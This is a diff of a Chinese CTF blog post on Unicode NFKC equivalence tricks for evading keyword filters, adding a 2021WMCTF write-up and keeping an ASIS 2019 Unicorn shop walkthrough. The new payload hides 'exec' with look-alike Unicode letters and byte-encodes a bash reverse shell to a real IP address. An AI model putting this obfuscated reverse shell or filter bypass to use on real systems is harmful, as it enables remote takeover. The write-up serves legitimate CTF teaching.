@@ -21,13 +21,18 @@
     <meta name="keywords" content="hexo,HackerQWQ,blog,CTFer">
     
     <meta name="description" content="">
-    <meta name="description" content="前置知识Unicode设计的安全性Unicode等价性浅谈unicode等价字符搜索网站 其中提供了一个脚本用于生成替换表 1234567891011121314151617181920212223242526272829303132#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import norm">
+    <meta name="description" content="前置知识Unicode设计的安全性Unicode等价性浅谈 Unicode等价替换标准等价和兼容等价Unicode分为标准等价和兼容等价  标准等价是指保持视觉上和功能上的等价。例如字符‘ü’和由‘u’及 ‘¨’所组成的序列是标准等价  兼容等价更着重于单个字符，也就是我们下面要用到的unicode替换，如𝑓经过NFKC转换后兼容等价于f    四种转换形式 利用方式有时候防御方会ban掉敏感字">
 <meta property="og:type" content="article">
 <meta property="og:title" content="unicode等价替换">
 <meta property="og:url" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前置知识Unicode设计的安全性Unicode等价性浅谈unicode等价字符搜索网站 其中提供了一个脚本用于生成替换表 1234567891011121314151617181920212223242526272829303132#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding: utf-8 -*-import jsonfrom unicodedata import norm">
+<meta property="og:description" content="前置知识Unicode设计的安全性Unicode等价性浅谈 Unicode等价替换标准等价和兼容等价Unicode分为标准等价和兼容等价  标准等价是指保持视觉上和功能上的等价。例如字符‘ü’和由‘u’及 ‘¨’所组成的序列是标准等价  兼容等价更着重于单个字符，也就是我们下面要用到的unicode替换，如𝑓经过NFKC转换后兼容等价于f    四种转换形式 利用方式有时候防御方会ban掉敏感字">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831140107200.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831140223137.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831143102316.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/6d5c876b-2522-41d3-97d4-755f226efb9a.png">
+<meta property="og:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831144442169.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/1.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/2.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/3.png">
@@ -36,12 +41,12 @@
 <meta property="og:image" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/6.png">
 <meta property="og:image" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/7.png">
 <meta property="article:published_time" content="2020-11-17T10:45:12.000Z">
-<meta property="article:modified_time" content="2021-05-17T05:57:32.734Z">
+<meta property="article:modified_time" content="2021-08-31T06:47:14.072Z">
 <meta property="article:author" content="HacKerQWQ">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="编码漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/1.png">
+<meta name="twitter:image" content="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831140107200.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -297,7 +302,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">382</span>Reading time: <span class="post-count reading-time">1 min</span></span>
+                        <span>Word count: <span class="post-count word-count">890</span>Reading time: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -427,10 +432,50 @@ height:50vh;
             
 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5402#toc-0">Unicode设计的安全性</a><br><a target="_blank" rel="noopener" href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a><br><a target="_blank" rel="noopener" href="https://teshuzi.com/zh/tu61.html">unicode等价字符搜索网站</a></p>
-<p>其中提供了一个脚本用于生成替换表</p>
+        <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5402#toc-0">Unicode设计的安全性</a><br><a target="_blank" rel="noopener" href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a></p>
+<h1 id="Unicode等价替换"><a href="#Unicode等价替换" class="headerlink" title="Unicode等价替换"></a>Unicode等价替换</h1><h2 id="标准等价和兼容等价"><a href="#标准等价和兼容等价" class="headerlink" title="标准等价和兼容等价"></a>标准等价和兼容等价</h2><p>Unicode分为标准等价和兼容等价</p>
+<ul>
+<li><p>标准等价是指保持视觉上和功能上的等价。例如字符‘ü’和由‘u’及 ‘¨’所组成的序列是标准等价</p>
+</li>
+<li><p>兼容等价更着重于单个字符，也就是我们下面要用到的unicode替换，如<code>𝑓</code>经过NFKC转换后兼容等价于<code>f</code></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831140107200.png" alt="image-20210831140107200"></p>
+</li>
+</ul>
+<h2 id="四种转换形式"><a href="#四种转换形式" class="headerlink" title="四种转换形式"></a>四种转换形式</h2><p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831140223137.png" alt="image-20210831140223137"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>有时候防御方会ban掉敏感字符，这时候就可以利用unicode字符欺骗的方式绕过字符过滤</p>
+<p>由于不同的脚本语言提供了不同的转换方式，因此不同的脚本语言有不同的绕过方式</p>
+<ol>
+<li><p>python使用NFKC的转换方式</p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/62256014/does-python-forbid-two-similarly-looking-unicode-identifiers">https://stackoverflow.com/questions/62256014/does-python-forbid-two-similarly-looking-unicode-identifiers</a></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831143102316.png" alt="image-20210831143102316"></p>
+<p>python脚本生成替换表</p>
+</li>
+</ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> unicodedata <span class="keyword">import</span> normalize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    tables = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x10000</span>):</span><br><span class="line">        src = unichr(i)</span><br><span class="line">        dst = normalize(<span class="string">&#x27;NFKC&#x27;</span>, src)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> ord(dst) &lt; <span class="number">128</span> <span class="keyword">and</span> dst != src:</span><br><span class="line">                <span class="keyword">if</span> debug:</span><br><span class="line">                    print(<span class="string">&quot;%s (\\u%s) -- normalize --&gt; %s (\\x%s)&quot;</span> % (</span><br><span class="line">                        src, hex(i)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>),</span><br><span class="line">                        dst, hex(dst.charAt(<span class="number">0</span>))[<span class="number">2</span>:]</span><br><span class="line">                    ))</span><br><span class="line">                <span class="keyword">if</span> dst <span class="keyword">in</span> tables:</span><br><span class="line">                    tables[dst].append(src)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    tables[dst] = [src]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(repr(e))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;nfctable.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">        json.dump(tables, fh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/1.png"><br>一个购买独角兽的界面，前面几个都买不了，显示如下<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/2.png"><br>但是到购买第四个独角兽的时候显示不一样，只能输入一个字符<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/3.png"><br>抓包也有提示<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/4.png"><br>很多网站都是<code>UTF-8</code>编码，怎么到这就不一样了，再结合只能输入一个字符的错误提示，应该想到是编码安全的问题,通过构造相似的字符来绕过ssrf的waf是常用的手段，现在用到了这里<br>到这个网站<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a> 寻找合适的字符，搜索<code>thousand</code>随便找一个数值大于<code>1337</code>的，因为购买第四个独角兽需要1337，因此需要找Unicode大于1337的跟它比较，大于它才能成功<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/5.png"><br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/6.png"><br>将<code>0x</code>替换为<code>%</code>，url解码之后就会变回特殊字符<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/7.png"><br>得到flag</p>
+<ol start="2">
+<li><p>其他的脚本语言</p>
+<p><a target="_blank" rel="noopener" href="http://rosettacode.org/wiki/Unicode_variable_names#Rust">http://rosettacode.org/wiki/Unicode_variable_names#Rust</a></p>
+</li>
+</ol>
+<p>也可以到以下网站寻找可替换的unicode字符</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.52unicode.com/mathematical-alphanumeric-symbols-zifu">http://www.52unicode.com/mathematical-alphanumeric-symbols-zifu</a></li>
+<li><a target="_blank" rel="noopener" href="https://teshuzi.com/zh/tu61.html">https://teshuzi.com/zh/tu61.html</a></li>
+</ul>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2021WMCTF-Number"><a href="#2021WMCTF-Number" class="headerlink" title="2021WMCTF Number"></a>2021WMCTF Number</h2><p>考点：unicode字符欺骗</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/6d5c876b-2522-41d3-97d4-755f226efb9a.png" alt="6d5c876b-2522-41d3-97d4-755f226efb9a"></p>
+<p>当输入的number等于lucky_number时，返回<code>You&#39;re so lucky</code>其实没什么用，真正的考点在代码执行</p>
+<p>参考T4rn师傅的文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9271">https://xz.aliyun.com/t/9271</a></p>
+<p>将exec替换为其他unicode字符<code>𝑒𝑥𝑒𝑐</code></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20210831144442169.png" alt="image-20210831144442169"></p>
+<p>然后将其他字符转换为bytes相加</p>
+<p>最终payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name=𝑒𝑥𝑒𝑐(bytes([<span class="number">105</span>])+bytes([<span class="number">109</span>])+bytes([<span class="number">112</span>])+bytes([<span class="number">111</span>])+bytes([<span class="number">114</span>])+bytes([<span class="number">116</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">111</span>])+bytes([<span class="number">115</span>])+bytes([<span class="number">59</span>])+bytes([<span class="number">111</span>])+bytes([<span class="number">115</span>])+bytes([<span class="number">46</span>])+bytes([<span class="number">115</span>])+bytes([<span class="number">121</span>])+bytes([<span class="number">115</span>])+bytes([<span class="number">116</span>])+bytes([<span class="number">101</span>])+bytes([<span class="number">109</span>])+bytes([<span class="number">40</span>])+bytes([<span class="number">34</span>])+bytes([<span class="number">98</span>])+bytes([<span class="number">97</span>])+bytes([<span class="number">115</span>])+bytes([<span class="number">104</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">45</span>])+bytes([<span class="number">99</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">39</span>])+bytes([<span class="number">101</span>])+bytes([<span class="number">120</span>])+bytes([<span class="number">101</span>])+bytes([<span class="number">99</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">98</span>])+bytes([<span class="number">97</span>])+bytes([<span class="number">115</span>])+bytes([<span class="number">104</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">45</span>])+bytes([<span class="number">105</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">38</span>])+bytes([<span class="number">62</span>])+bytes([<span class="number">47</span>])+bytes([<span class="number">100</span>])+bytes([<span class="number">101</span>])+bytes([<span class="number">118</span>])+bytes([<span class="number">47</span>])+bytes([<span class="number">116</span>])+bytes([<span class="number">99</span>])+bytes([<span class="number">112</span>])+bytes([<span class="number">47</span>])+bytes([<span class="number">52</span>])+bytes([<span class="number">50</span>])+bytes([<span class="number">46</span>])+bytes([<span class="number">49</span>])+bytes([<span class="number">57</span>])+bytes([<span class="number">50</span>])+bytes([<span class="number">46</span>])+bytes([<span class="number">49</span>])+bytes([<span class="number">51</span>])+bytes([<span class="number">54</span>])+bytes([<span class="number">46</span>])+bytes([<span class="number">49</span>])+bytes([<span class="number">52</span>])+bytes([<span class="number">56</span>])+bytes([<span class="number">47</span>])+bytes([<span class="number">49</span>])+bytes([<span class="number">50</span>])+bytes([<span class="number">51</span>])+bytes([<span class="number">52</span>])+bytes([<span class="number">32</span>])+bytes([<span class="number">60</span>])+bytes([<span class="number">38</span>])+bytes([<span class="number">49</span>])+bytes([<span class="number">39</span>])+bytes([<span class="number">34</span>])+bytes([<span class="number">41</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>即</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name&#x3D;exec(b&#39;import os;os.system(&quot;bash -c \&#39;exec bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;42.192.136.148&#x2F;1234 &lt;&amp;1\&#39;&quot;)&#39;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/1.png"><br>一个购买独角兽的界面，前面几个都买不了，显示如下<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/2.png"><br>但是到购买第四个独角兽的时候显示不一样，只能输入一个字符<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/3.png"><br>抓包也有提示<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/4.png"><br>很多网站都是<code>UTF-8</code>编码，怎么到这就不一样了，再结合只能输入一个字符的错误提示，应该想到是编码安全的问题,通过构造相似的字符来绕过ssrf的waf是常用的手段，现在用到了这里<br>到这个网站<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">https://www.compart.com/en/unicode/</a> 寻找合适的字符，搜索<code>thousand</code>随便找一个数值大于<code>1337</code>的，因为购买第四个独角兽需要1337，因此需要找Unicode大于1337的跟它比较，大于它才能成功<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/5.png"><br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/6.png"><br>将<code>0x</code>替换为<code>%</code>，url解码之后就会变回特殊字符<br><img src="/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/7.png"><br>得到flag</p>
 <p><code>blackhat 2019</code>上面也有这个相似的议题</p>
 
     </article>
@@ -440,7 +485,7 @@ height:50vh;
             <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
             <p>原文链接：<a href="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/">https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/">November 17th 2020, 6:45:12 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/">May 17th 2021, 1:57:32 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/11/17/unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2/">August 31st 2021, 2:47:14 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -585,7 +630,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">2.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unicode%E7%AD%89%E4%BB%B7%E6%9B%BF%E6%8D%A2"><span class="toc-number">2.</span> <span class="toc-text">Unicode等价替换</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%87%E5%87%86%E7%AD%89%E4%BB%B7%E5%92%8C%E5%85%BC%E5%AE%B9%E7%AD%89%E4%BB%B7"><span class="toc-number">2.1.</span> <span class="toc-text">标准等价和兼容等价</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E8%BD%AC%E6%8D%A2%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.2.</span> <span class="toc-text">四种转换形式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2021WMCTF-Number"><span class="toc-number">3.1.</span> <span class="toc-text">2021WMCTF Number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">3.2.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2288,9 +2333,88 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 106
+        Total : 111
         </div>
         <!-- search  -->
         
@@ -2307,6 +2431,31 @@ top:50vh;
     
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2021/09/05/python%E5%86%85%E7%BD%AE%E6%A8%A1%E5%9D%97%E7%9A%84%E5%AF%BC%E5%85%A5%E5%8F%8A%E8%A6%86%E7%9B%96%E7%9F%A5%E8%AF%86/" >python内置模块的导入及覆盖知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2021/09/02/TP5RCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5-0-0-ThinkPHP5-5-0-23-5-1-0-ThinkPHP-5-1-30/" >TP5RCE代码执行漏洞分析(5.0.0<=ThinkPHP5<=5.0.23,5.1.0<=ThinkPHP<=5.1.30</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2021/08/31/php%E5%8F%8D%E5%B0%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" >php反射利用总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2021/08/31/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/" >php内置类的利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2021/08/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8BFast-Destruct/" >PHP反序列化小技巧之Fast Destruct</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -2858,9 +3007,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
-    
         <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
         <span class="sidebar-tag-name" data-tags="2021CISCN"><span class="iconfont-archer">&#xe606;</span>2021CISCN</span>
     
@@ -2886,15 +3035,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
     
-        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
-    
-        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
     
         <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
@@ -2907,6 +3056,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
     
         <span class="sidebar-tag-name" data-tags="PHP代码审计"><span class="iconfont-archer">&#xe606;</span>PHP代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
@@ -2944,11 +3095,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
         <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="2019CISCN"><span class="iconfont-archer">&#xe606;</span>2019CISCN</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
         <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
     
@@ -2982,9 +3139,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="文件上传漏洞"><span class="iconfont-archer">&#xe606;</span>文件上传漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
-    
         <span class="sidebar-tag-name" data-tags="无参数构造payload"><span class="iconfont-archer">&#xe606;</span>无参数构造payload</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
